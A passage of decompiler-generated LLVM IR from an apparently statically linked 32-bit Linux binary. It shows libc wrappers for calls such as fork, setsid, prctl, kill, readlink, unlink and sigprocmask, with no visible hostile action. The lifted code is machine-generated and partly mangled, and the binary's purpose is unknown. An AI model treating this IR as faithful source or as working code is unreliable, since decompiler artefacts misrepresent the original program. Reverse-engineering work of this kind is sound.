  uselistorder label %dec_label_pc_8050f1c, { 1, 0 }
}

define i32 @function_8050f24(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050f24:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050f24 = load i32, i32* @edi, align 4
  store i32 %v0_8050f24, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_8050f3c = load i32, i32* @ebx, align 4
  %v1_8050f44 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8050f44, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_8050f44, -4095
  br i1 %tmp12, label %dec_label_pc_8050f5c, label %dec_label_pc_8050f50

dec_label_pc_8050f50:                             ; preds = %dec_label_pc_8050f24
  %v1_8050f50 = call i32 @function_805149b(i32 %v0_8050f3c)
  %v0_8050f55 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050f55 = sub i32 0, %v0_8050f55
  %v2_8050f57 = inttoptr i32 %v1_8050f50 to i32*
  store i32 %v1_8050f55, i32* %v2_8050f57, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8050f61.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050f5c

dec_label_pc_8050f5c:                             ; preds = %dec_label_pc_8050f24, %dec_label_pc_8050f50
  %v2_8050f61 = phi i32 [ %v0_8050f24, %dec_label_pc_8050f24 ], [ %v2_8050f61.pre, %dec_label_pc_8050f50 ]
  %v0_8050f5c = phi i32 [ %v1_8050f44, %dec_label_pc_8050f24 ], [ -1, %dec_label_pc_8050f50 ]
  store i32 %v2_8050f61, i32* %edi.global-to-local, align 4
  ret i32 %v0_8050f5c

; uselistorder directives
  uselistorder i32 %v1_8050f44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050f5c, { 1, 0 }
}

define i32 @function_8050f63(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050f63:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050f63 = load i32, i32* @edi, align 4
  store i32 %v0_8050f63, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050f6b = load i32, i32* @ebx, align 4
  %v1_8050f73 = call i32 @close(i32 %arg1)
  store i32 %v0_8050f6b, i32* @ebx, align 4
  store i32 %v1_8050f73, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8050f73, -4095
  br i1 %tmp9, label %dec_label_pc_8050f8b, label %dec_label_pc_8050f7f

dec_label_pc_8050f7f:                             ; preds = %dec_label_pc_8050f63
  %v1_8050f7f = call i32 @function_805149b(i32 %v0_8050f6b)
  %v0_8050f84 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050f84 = sub i32 0, %v0_8050f84
  %v2_8050f86 = inttoptr i32 %v1_8050f7f to i32*
  store i32 %v1_8050f84, i32* %v2_8050f86, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8050f8f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050f8b

dec_label_pc_8050f8b:                             ; preds = %dec_label_pc_8050f63, %dec_label_pc_8050f7f
  %v2_8050f8f = phi i32 [ %v0_8050f63, %dec_label_pc_8050f63 ], [ %v2_8050f8f.pre, %dec_label_pc_8050f7f ]
  %v0_8050f8b = phi i32 [ %v1_8050f73, %dec_label_pc_8050f63 ], [ -1, %dec_label_pc_8050f7f ]
  store i32 %v2_8050f8f, i32* @edi, align 4
  ret i32 %v0_8050f8b

; uselistorder directives
  uselistorder i32 %v1_8050f73, { 1, 0, 2 }
  uselistorder i32 %v0_8050f6b, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050f8b, { 1, 0 }
}

define i32 @function_8050f91() local_unnamed_addr {
dec_label_pc_8050f91:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050f91 = load i32, i32* @ebx, align 4
  store i32 %v0_8050f91, i32* %stack_var_-4, align 4
  %v1_8050f9a = call i32 @fork(i32 %v0_8050f91)
  store i32 %v1_8050f9a, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8050f9a, -4095
  br i1 %tmp7, label %dec_label_pc_8050fb1, label %dec_label_pc_8050fa5

dec_label_pc_8050fa5:                             ; preds = %dec_label_pc_8050f91
  %v1_8050fa5 = call i32 @function_805149b(i32 %v0_8050f91)
  %v0_8050faa = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050faa = sub i32 0, %v0_8050faa
  %v2_8050fac = inttoptr i32 %v1_8050fa5 to i32*
  store i32 %v1_8050faa, i32* %v2_8050fac, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8050fb5.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050fb1

dec_label_pc_8050fb1:                             ; preds = %dec_label_pc_8050f91, %dec_label_pc_8050fa5
  %v2_8050fb5 = phi i32 [ %v0_8050f91, %dec_label_pc_8050f91 ], [ %v2_8050fb5.pre, %dec_label_pc_8050fa5 ]
  %v0_8050fb1 = phi i32 [ %v1_8050f9a, %dec_label_pc_8050f91 ], [ -1, %dec_label_pc_8050fa5 ]
  store i32 %v2_8050fb5, i32* @ebx, align 4
  ret i32 %v0_8050fb1

; uselistorder directives
  uselistorder i32 %v1_8050f9a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050fb1, { 1, 0 }
}

define i32 @function_8050fb7() local_unnamed_addr {
dec_label_pc_8050fb7:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050fb7 = load i32, i32* @ebx, align 4
  store i32 %v0_8050fb7, i32* %stack_var_-4, align 4
  %v1_8050fc0 = call i32 @getpid(i32 %v0_8050fb7)
  store i32 %v1_8050fc0, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8050fc0, -4095
  br i1 %tmp7, label %dec_label_pc_8050fd7, label %dec_label_pc_8050fcb

dec_label_pc_8050fcb:                             ; preds = %dec_label_pc_8050fb7
  %v1_8050fcb = call i32 @function_805149b(i32 %v0_8050fb7)
  %v0_8050fd0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050fd0 = sub i32 0, %v0_8050fd0
  %v2_8050fd2 = inttoptr i32 %v1_8050fcb to i32*
  store i32 %v1_8050fd0, i32* %v2_8050fd2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8050fdb.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050fd7

dec_label_pc_8050fd7:                             ; preds = %dec_label_pc_8050fb7, %dec_label_pc_8050fcb
  %v2_8050fdb = phi i32 [ %v0_8050fb7, %dec_label_pc_8050fb7 ], [ %v2_8050fdb.pre, %dec_label_pc_8050fcb ]
  %v0_8050fd7 = phi i32 [ %v1_8050fc0, %dec_label_pc_8050fb7 ], [ -1, %dec_label_pc_8050fcb ]
  %v2_8050fd9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050fd9, i32* @edx, align 4
  store i32 %v2_8050fdb, i32* @ebx, align 4
  ret i32 %v0_8050fd7

; uselistorder directives
  uselistorder i32 %v1_8050fc0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050fd7, { 1, 0 }
}

define i32 @function_8050fdd() local_unnamed_addr {
dec_label_pc_8050fdd:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050fdd = load i32, i32* @ebx, align 4
  store i32 %v0_8050fdd, i32* %stack_var_-4, align 4
  %v1_8050fe6 = call i32 @getppid(i32 %v0_8050fdd)
  store i32 %v1_8050fe6, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8050fe6, -4095
  br i1 %tmp7, label %dec_label_pc_8050ffd, label %dec_label_pc_8050ff1

dec_label_pc_8050ff1:                             ; preds = %dec_label_pc_8050fdd
  %v1_8050ff1 = call i32 @function_805149b(i32 %v0_8050fdd)
  %v0_8050ff6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050ff6 = sub i32 0, %v0_8050ff6
  %v2_8050ff8 = inttoptr i32 %v1_8050ff1 to i32*
  store i32 %v1_8050ff6, i32* %v2_8050ff8, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051001.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050ffd

dec_label_pc_8050ffd:                             ; preds = %dec_label_pc_8050fdd, %dec_label_pc_8050ff1
  %v2_8051001 = phi i32 [ %v0_8050fdd, %dec_label_pc_8050fdd ], [ %v2_8051001.pre, %dec_label_pc_8050ff1 ]
  %v0_8050ffd = phi i32 [ %v1_8050fe6, %dec_label_pc_8050fdd ], [ -1, %dec_label_pc_8050ff1 ]
  store i32 %v2_8051001, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8050ffd

; uselistorder directives
  uselistorder i32 %v1_8050fe6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050ffd, { 1, 0 }
}

define i32 @function_8051003(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051003:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051003 = load i32, i32* @edi, align 4
  store i32 %v0_8051003, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805101b = load i32, i32* @ebx, align 4
  %v2_8051023 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_8051023, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v2_8051023, -4095
  br i1 %tmp12, label %dec_label_pc_805103b, label %dec_label_pc_805102f

dec_label_pc_805102f:                             ; preds = %dec_label_pc_8051003
  %v1_805102f = call i32 @function_805149b(i32 %v0_805101b)
  %v0_8051034 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051034 = sub i32 0, %v0_8051034
  %v2_8051036 = inttoptr i32 %v1_805102f to i32*
  store i32 %v1_8051034, i32* %v2_8051036, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8051040.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805103b

dec_label_pc_805103b:                             ; preds = %dec_label_pc_8051003, %dec_label_pc_805102f
  %v2_8051040 = phi i32 [ %v0_8051003, %dec_label_pc_8051003 ], [ %v2_8051040.pre, %dec_label_pc_805102f ]
  %v0_805103b = phi i32 [ %v2_8051023, %dec_label_pc_8051003 ], [ -1, %dec_label_pc_805102f ]
  store i32 %v2_8051040, i32* %edi.global-to-local, align 4
  ret i32 %v0_805103b

; uselistorder directives
  uselistorder i32 %v2_8051023, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805103b, { 1, 0 }
}

define i32 @function_8051042(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051042:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051042 = load i32, i32* @ebx, align 4
  store i32 %v0_8051042, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8051055 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_8051055, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_8051055, -4095
  br i1 %tmp9, label %dec_label_pc_805106e, label %dec_label_pc_8051062

dec_label_pc_8051062:                             ; preds = %dec_label_pc_8051042
  %v1_8051062 = call i32 @function_805149b(i32 %v0_8051042)
  %v0_8051067 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051067 = sub i32 0, %v0_8051067
  %v2_8051069 = inttoptr i32 %v1_8051062 to i32*
  store i32 %v1_8051067, i32* %v2_8051069, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051072.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805106e

dec_label_pc_805106e:                             ; preds = %dec_label_pc_8051042, %dec_label_pc_8051062
  %v2_8051072 = phi i32 [ %v0_8051042, %dec_label_pc_8051042 ], [ %v2_8051072.pre, %dec_label_pc_8051062 ]
  %v0_805106e = phi i32 [ %v2_8051055, %dec_label_pc_8051042 ], [ -1, %dec_label_pc_8051062 ]
  %v2_8051070 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051070, i32* @edx, align 4
  store i32 %v2_8051072, i32* @ebx, align 4
  ret i32 %v0_805106e

; uselistorder directives
  uselistorder i32 %v2_8051055, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805106e, { 1, 0 }
}

define i32 @function_8051074(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051074:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8051075 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_805107b = sdiv i32 %sext, 16777216
  %v4_805107f = ptrtoint i8* %arg1 to i32
  %v3_8051083 = and i32 %arg2, 64
  %v4_8051083 = icmp eq i32 %v3_8051083, 0
  br i1 %v4_8051083, label %dec_label_pc_8051094, label %dec_label_pc_8051088

dec_label_pc_8051088:                             ; preds = %dec_label_pc_8051074
  br label %dec_label_pc_8051094

dec_label_pc_8051094:                             ; preds = %dec_label_pc_8051074, %dec_label_pc_8051088
  store i32 %v4_805107f, i32* %ebx.global-to-local, align 4
  %v5_805109f = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_805107b)
  store i32 %v5_805109f, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_805109f, -4095
  br i1 %tmp15, label %dec_label_pc_80510b7, label %dec_label_pc_80510ab

dec_label_pc_80510ab:                             ; preds = %dec_label_pc_8051094
  %v1_80510ab = call i32 @function_805149b(i32 %v0_8051075)
  %v0_80510b0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80510b0 = sub i32 0, %v0_80510b0
  %v2_80510b2 = inttoptr i32 %v1_80510ab to i32*
  store i32 %v1_80510b0, i32* %v2_80510b2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80510b7

dec_label_pc_80510b7:                             ; preds = %dec_label_pc_8051094, %dec_label_pc_80510ab
  %v0_80510b7 = phi i32 [ %v5_805109f, %dec_label_pc_8051094 ], [ -1, %dec_label_pc_80510ab ]
  store i32 %v0_8051075, i32* @ebx, align 4
  ret i32 %v0_80510b7

; uselistorder directives
  uselistorder i32 %v5_805109f, { 1, 0, 2 }
  uselistorder i32 %v0_8051075, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80510b7, { 1, 0 }
  uselistorder label %dec_label_pc_8051094, { 1, 0 }
}

define i32 @function_80510bf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_80510bf:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80510c0 = load i32, i32* @esi, align 4
  store i32 %v0_80510c0, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80510d8 = load i32, i32* @ebx, align 4
  %v5_80510e0 = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  store i32 %v5_80510e0, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v5_80510e0, -4095
  br i1 %tmp12, label %dec_label_pc_80510f8, label %dec_label_pc_80510ec

dec_label_pc_80510ec:                             ; preds = %dec_label_pc_80510bf
  %v1_80510ec = call i32 @function_805149b(i32 %v0_80510d8)
  %v0_80510f1 = load i32, i32* %esi.global-to-local, align 4
  %v1_80510f1 = sub i32 0, %v0_80510f1
  %v2_80510f3 = inttoptr i32 %v1_80510ec to i32*
  store i32 %v1_80510f1, i32* %v2_80510f3, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_80510fb.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80510f8

dec_label_pc_80510f8:                             ; preds = %dec_label_pc_80510bf, %dec_label_pc_80510ec
  %v2_80510fb = phi i32 [ %v0_80510c0, %dec_label_pc_80510bf ], [ %v2_80510fb.pre, %dec_label_pc_80510ec ]
  %v0_80510f8 = phi i32 [ %v5_80510e0, %dec_label_pc_80510bf ], [ -1, %dec_label_pc_80510ec ]
  store i32 %v2_80510fb, i32* %esi.global-to-local, align 4
  ret i32 %v0_80510f8

; uselistorder directives
  uselistorder i32 %v5_80510e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80510f8, { 1, 0 }
}

define i32 @function_80510fe(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80510fe:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80510fe = load i32, i32* @edi, align 4
  store i32 %v0_80510fe, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805110e = load i32, i32* @ebx, align 4
  %v4_8051116 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_8051116, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8051116, -4095
  br i1 %tmp12, label %dec_label_pc_805112e, label %dec_label_pc_8051122

dec_label_pc_8051122:                             ; preds = %dec_label_pc_80510fe
  %v1_8051122 = call i32 @function_805149b(i32 %v0_805110e)
  %v0_8051127 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051127 = sub i32 0, %v0_8051127
  %v2_8051129 = inttoptr i32 %v1_8051122 to i32*
  store i32 %v1_8051127, i32* %v2_8051129, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8051132.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805112e

dec_label_pc_805112e:                             ; preds = %dec_label_pc_80510fe, %dec_label_pc_8051122
  %v2_8051132 = phi i32 [ %v0_80510fe, %dec_label_pc_80510fe ], [ %v2_8051132.pre, %dec_label_pc_8051122 ]
  %v0_805112e = phi i32 [ %v4_8051116, %dec_label_pc_80510fe ], [ -1, %dec_label_pc_8051122 ]
  store i32 %v2_8051132, i32* %edi.global-to-local, align 4
  ret i32 %v0_805112e

; uselistorder directives
  uselistorder i32 %v4_8051116, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805112e, { 1, 0 }
}

define i32 @function_8051134(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051134:
  %edi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to i8*
  %stack_var_-4 = alloca i32, align 4
  %v0_8051134 = load i32, i32* @edi, align 4
  store i32 %v0_8051134, i32* %stack_var_-4, align 4
  %v4_8051138 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051138, i32* %edi.global-to-local, align 4
  %v0_8051144 = load i32, i32* @ebx, align 4
  %v7_805114c = call i32 @readlink(i8* %arg1, i8* %tmp5, i32 %arg3)
  store i32 %v7_805114c, i32* %edi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_805114c, -4095
  br i1 %tmp13, label %dec_label_pc_8051164, label %dec_label_pc_8051158

dec_label_pc_8051158:                             ; preds = %dec_label_pc_8051134
  %v1_8051158 = call i32 @function_805149b(i32 %v0_8051144)
  %v0_805115d = load i32, i32* %edi.global-to-local, align 4
  %v1_805115d = sub i32 0, %v0_805115d
  %v2_805115f = inttoptr i32 %v1_8051158 to i32*
  store i32 %v1_805115d, i32* %v2_805115f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8051168.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051164

dec_label_pc_8051164:                             ; preds = %dec_label_pc_8051134, %dec_label_pc_8051158
  %v2_8051168 = phi i32 [ %v0_8051134, %dec_label_pc_8051134 ], [ %v2_8051168.pre, %dec_label_pc_8051158 ]
  %v0_8051164 = phi i32 [ %v7_805114c, %dec_label_pc_8051134 ], [ -1, %dec_label_pc_8051158 ]
  store i32 %v2_8051168, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051164

; uselistorder directives
  uselistorder i32 %v7_805114c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051164, { 1, 0 }
}

define i32 @function_805116a() local_unnamed_addr {
dec_label_pc_805116a:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805116b = load i32, i32* @esi, align 4
  store i32 %v0_805116b, i32* %stack_var_-8, align 4
  %v0_8051183 = load i32, i32* @ebx, align 4
  %v1_805118b = call i32 @int80_syscall(i32 142)
  store i32 %v0_8051183, i32* @ebx, align 4
  store i32 %v1_805118b, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_805118b, -4095
  br i1 %tmp12, label %dec_label_pc_80511a3, label %dec_label_pc_8051197

dec_label_pc_8051197:                             ; preds = %dec_label_pc_805116a
  %v1_8051197 = call i32 @function_805149b(i32 %v0_8051183)
  %v0_805119c = load i32, i32* %esi.global-to-local, align 4
  %v1_805119c = sub i32 0, %v0_805119c
  %v2_805119e = inttoptr i32 %v1_8051197 to i32*
  store i32 %v1_805119c, i32* %v2_805119e, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_80511a6.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80511a3

dec_label_pc_80511a3:                             ; preds = %dec_label_pc_805116a, %dec_label_pc_8051197
  %v2_80511a6 = phi i32 [ %v0_805116b, %dec_label_pc_805116a ], [ %v2_80511a6.pre, %dec_label_pc_8051197 ]
  %v0_80511a3 = phi i32 [ %v1_805118b, %dec_label_pc_805116a ], [ -1, %dec_label_pc_8051197 ]
  store i32 %v2_80511a6, i32* @esi, align 4
  ret i32 %v0_80511a3

; uselistorder directives
  uselistorder i32 %v1_805118b, { 1, 0, 2 }
  uselistorder i32 %v0_8051183, { 1, 0 }
  uselistorder label %dec_label_pc_80511a3, { 1, 0 }
}

define i32 @function_80511a9() local_unnamed_addr {
dec_label_pc_80511a9:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80511a9 = load i32, i32* @ebx, align 4
  store i32 %v0_80511a9, i32* %stack_var_-4, align 4
  %v1_80511b2 = call i32 @setsid(i32 %v0_80511a9)
  store i32 %v1_80511b2, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80511b2, -4095
  br i1 %tmp7, label %dec_label_pc_80511c9, label %dec_label_pc_80511bd

dec_label_pc_80511bd:                             ; preds = %dec_label_pc_80511a9
  %v1_80511bd = call i32 @function_805149b(i32 %v0_80511a9)
  %v0_80511c2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80511c2 = sub i32 0, %v0_80511c2
  %v2_80511c4 = inttoptr i32 %v1_80511bd to i32*
  store i32 %v1_80511c2, i32* %v2_80511c4, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80511cd.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80511c9

dec_label_pc_80511c9:                             ; preds = %dec_label_pc_80511a9, %dec_label_pc_80511bd
  %v2_80511cd = phi i32 [ %v0_80511a9, %dec_label_pc_80511a9 ], [ %v2_80511cd.pre, %dec_label_pc_80511bd ]
  %v0_80511c9 = phi i32 [ %v1_80511b2, %dec_label_pc_80511a9 ], [ -1, %dec_label_pc_80511bd ]
  store i32 %v2_80511cd, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80511c9

; uselistorder directives
  uselistorder i32 %v1_80511b2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80511c9, { 1, 0 }
}

define i32 @function_80511cf(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80511cf:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80511d0 = load i32, i32* @esi, align 4
  %v4_80511d4 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_80511d4, i32* @ecx, align 4
  %v2_80511e0 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  %tmp11 = icmp ult i32 %arg1, 3
  %or.cond = or i1 %tmp11, %v2_80511e0
  br i1 %or.cond, label %dec_label_pc_80511f9, label %dec_label_pc_80511e9

dec_label_pc_80511e9:                             ; preds = %dec_label_pc_80511cf
  %v1_80511e9 = call i32 @function_805149b(i32 %v0_80511d0)
  %v1_80511ee = inttoptr i32 %v1_80511e9 to i32*
  store i32 22, i32* %v1_80511ee, align 4
  br label %dec_label_pc_8051220

dec_label_pc_80511f9:                             ; preds = %dec_label_pc_80511cf
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_80511fe = load i32, i32* @ebx, align 4
  %v7_8051206 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_80511fe, i32* @ebx, align 4
  store i32 %v7_8051206, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_8051206, -4095
  br i1 %tmp12, label %dec_label_pc_8051220, label %dec_label_pc_8051212

dec_label_pc_8051212:                             ; preds = %dec_label_pc_80511f9
  %v1_8051212 = call i32 @function_805149b(i32 %v0_80511fe)
  %v0_8051217 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051217 = sub i32 0, %v0_8051217
  %v2_8051219 = inttoptr i32 %v1_8051212 to i32*
  store i32 %v1_8051217, i32* %v2_8051219, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051220

dec_label_pc_8051220:                             ; preds = %dec_label_pc_8051212, %dec_label_pc_80511f9, %dec_label_pc_80511e9
  %storemerge = phi i32 [ -1, %dec_label_pc_80511e9 ], [ %v7_8051206, %dec_label_pc_80511f9 ], [ -1, %dec_label_pc_8051212 ]
  %v2_8051220 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051220, i32* @edx, align 4
  store i32 %v0_80511d0, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_8051206, { 1, 0, 2 }
  uselistorder i32 %v0_80511fe, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_8051224() local_unnamed_addr {
dec_label_pc_8051224:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051224 = load i32, i32* @edi, align 4
  store i32 %v0_8051224, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v0_805122c = load i32, i32* @ebx, align 4
  %v1_8051234 = inttoptr i32 %tmp to i32*
  %v2_8051234 = call i32 @time(i32* %v1_8051234)
  store i32 %v0_805122c, i32* @ebx, align 4
  store i32 %v2_8051234, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_8051234, -4095
  br i1 %tmp9, label %dec_label_pc_805124c, label %dec_label_pc_8051240

dec_label_pc_8051240:                             ; preds = %dec_label_pc_8051224
  %v1_8051240 = call i32 @function_805149b(i32 %v0_805122c)
  %v0_8051245 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051245 = sub i32 0, %v0_8051245
  %v2_8051247 = inttoptr i32 %v1_8051240 to i32*
  store i32 %v1_8051245, i32* %v2_8051247, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8051250.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805124c

dec_label_pc_805124c:                             ; preds = %dec_label_pc_8051224, %dec_label_pc_8051240
  %v2_8051250 = phi i32 [ %v0_8051224, %dec_label_pc_8051224 ], [ %v2_8051250.pre, %dec_label_pc_8051240 ]
  %v0_805124c = phi i32 [ %v2_8051234, %dec_label_pc_8051224 ], [ -1, %dec_label_pc_8051240 ]
  store i32 %v2_8051250, i32* %edi.global-to-local, align 4
  ret i32 %v0_805124c

; uselistorder directives
  uselistorder i32 %v2_8051234, { 1, 0, 2 }
  uselistorder i32 %v0_805122c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_805124c, { 1, 0 }
}

define i32 @function_8051252(i8* %arg1) local_unnamed_addr {
dec_label_pc_8051252:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051252 = load i32, i32* @edi, align 4
  store i32 %v0_8051252, i32* %stack_var_-4, align 4
  %v4_8051256 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051256, i32* %edi.global-to-local, align 4
  %v0_805125a = load i32, i32* @ebx, align 4
  %v3_8051262 = call i32 @unlink(i8* %arg1)
  store i32 %v3_8051262, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_8051262, -4095
  br i1 %tmp10, label %dec_label_pc_805127a, label %dec_label_pc_805126e

dec_label_pc_805126e:                             ; preds = %dec_label_pc_8051252
  %v1_805126e = call i32 @function_805149b(i32 %v0_805125a)
  %v0_8051273 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051273 = sub i32 0, %v0_8051273
  %v2_8051275 = inttoptr i32 %v1_805126e to i32*
  store i32 %v1_8051273, i32* %v2_8051275, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805127e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805127a

